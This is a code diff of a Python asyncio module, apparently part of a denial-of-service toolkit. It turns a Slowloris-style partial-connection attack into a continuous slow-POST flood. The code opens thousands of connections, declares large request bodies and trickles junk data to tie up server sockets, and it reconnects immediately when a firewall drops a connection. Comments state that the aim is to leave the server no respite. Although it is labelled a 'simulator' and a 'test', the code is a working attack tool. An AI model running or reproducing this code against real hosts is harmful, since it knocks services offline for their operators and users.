@@ -1,4 +1,4 @@
-# modules/layer7_async.py — Advanced L7 Asynchronous Simulator
+# modules/layer7_async.py — Advanced L7 Asynchronous Simulator (Continuous Mode)
 import asyncio
 import random
 import sys
@@ -6,66 +6,70 @@ from utils.colors import Colors
 from utils.logger import log_attack
 
 user_agents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
 ]
 
 async def maintain_partial_connection(host, port, session_id):
-    """ایک سنگل کنکشن کو اوپن رکھ کر سرور کے ساکٹ پول کو ٹیسٹ کرنا"""
-    try:
-        # سرور کے ساتھ کسٹم ہینڈ شیک بنانا
-        reader, writer = await asyncio.open_connection(host, port)
-        
-        # ابتدائی ادھورا ہیڈر بھیجنا
-        start_request = f"GET /{random.randint(1, 9999)} HTTP/1.1\r\n"
-        start_request += f"Host: {host}\r\n"
-        start_request += f"User-Agent: {random.choice(user_agents)}\r\n"
-        writer.write(start_request.encode())
-        await writer.drain()
-
-        # کنکشن کو برقرار رکھنے کے لیے وقفے وقفے سے فالتو ہیڈرز بھیجنا
-        while True:
-            await asyncio.sleep(random.randint(10, 20))
-            keep_alive_header = f"X-C9-Faizan-KeepAlive: {random.randint(1, 5000)}\r\n"
-            writer.write(keep_alive_header.encode())
-            await writer.drain()
-            
-    except (asyncio.CancelledError, Exception):
-        # کنکشن ڈراپ ہونے پر خاموشی سے ہینڈل کرنا
-        pass
-    finally:
+    """Server par lagatar heavy active sessions ka load barkarar rakhna"""
+    while True: # Infinite loop takay agar connection drop ho to foran naya banay
         try:
-            writer.close()
-            await writer.wait_closed()
-        except:
-            pass
+            reader, writer = await asyncio.open_connection(host, port)
+            
+            # Initial incomplete request header
+            start_request = f"POST /{random.randint(1, 9999)} HTTP/1.1\r\n"
+            start_request += f"Host: {host}\r\n"
+            start_request += f"User-Agent: {random.choice(user_agents)}\r\n"
+            start_request += f"Content-Length: {random.randint(5000, 50000)}\r\n" # Server ko heavy body ke intezar mein rakhna
+            start_request += "Content-Type: application/x-www-form-urlencoded\r\n"
+            writer.write(start_request.encode())
+            await writer.drain()
+
+            # Continuous Stream Phase: Har 1-3 seconds baad lagatar data bhejna
+            while True:
+                await asyncio.sleep(random.uniform(1.0, 3.0)) # Interval kam kar diya takay server ko saans na mile
+                # Dynamic junk data chunk generator
+                junk_payload = f"data_{random.randint(1, 9999)}={random.randint(1, 99999)}&"
+                writer.write(junk_payload.encode())
+                await writer.drain()
+                
+        except (asyncio.CancelledError):
+            # Jab user khud session close kare
+            try:
+                writer.close()
+                await writer.wait_closed()
+            except:
+                pass
+            break
+        except Exception:
+            # Agar network slow ya firewall temporary block kare, to 1 sec rukh kar foran naya socket open kare
+            await asyncio.sleep(1)
+            continue
 
 async def start_async_l7_test(host, port, duration, connection_limit):
-    log_attack("Async_L7_Slow_Test", host, port, duration)
-    print(Colors.info(f"Initiating High-Density Async Connection Test on {host}:{port}"))
-    print(Colors.warn(f"Simulating {connection_limit} parallel partial connections via Asyncio Event Loop..."))
+    log_attack("Async_L7_Continuous_Test", host, port, duration)
+    print(Colors.info(f"Initiating Aggressive Async Connection Test on {host}:{port}"))
+    print(Colors.warn(f"Spawning {connection_limit} continuous activity async streams..."))
 
     tasks = []
     
-    # ایونٹ لوپ میں بیک وقت ہزاروں ٹاسکس شیڈول کرنا
     for i in range(connection_limit):
         task = asyncio.create_task(maintain_partial_connection(host, port, i))
         tasks.append(task)
-        # سرور پر ایک دم لوڈ ڈالنے کے بجائے آہستہ آہستہ کنکشنز بڑھانا
         if i % 100 == 0:
-            await asyncio.sleep(0.1)
-            print(f"\r{Colors.success(f'Active Async Sockets Registered: {i}')}", end="")
+            await asyncio.sleep(0.05) # Sockets ko thoda tezi se register karne ke liye interval kam kiya
+            print(f"\r{Colors.success(f'Active Continuous Streams Registered: {i}')}", end="")
 
-    print(f"\n{Colors.success('All async connections are now holding inside the pool.')}")
+    print(f"\n{Colors.success('All streams are now active and running in continuous transmission loop.')}")
     
-    # ٹیسٹ کے مقررہ وقت تک انتظار کرنا
+    # Target duration tak load maintain rakhna
     await asyncio.sleep(duration)
     
-    # تمام ٹاسکس کو محفوظ طریقے سے بند کرنا
-    print(Colors.info("\nTerminating simulator session..."))
+    print(Colors.info("\nTerminating continuous simulator session..."))
     for task in tasks:
         task.cancel()
         
     await asyncio.gather(*tasks, return_exceptions=True)
     print(Colors.success("Test session safely wrapped up."))
+        
